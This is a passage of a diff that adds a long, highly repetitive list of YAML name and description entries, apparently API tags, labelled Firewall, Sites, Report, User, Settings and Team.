+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Firewall
+    description: Firewall
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: Report
+    description: Report
+  -
+    name: User
+    description: User
+  -
+    name: User
+    description: User
+  -
+    name: User
+    description: User
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Settings
+    description: Settings
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Sites
+    description: Sites
+  -
+    name: Team
+    description: Team
+  -
+    name: Team
+    description: Team
+  -
+    name: Team
+    description: Team
+  -
+    name: Team
+    description: Team
+  -
+    name: Team
+    description: Team
+  -
+    name: Team
+    description: Team
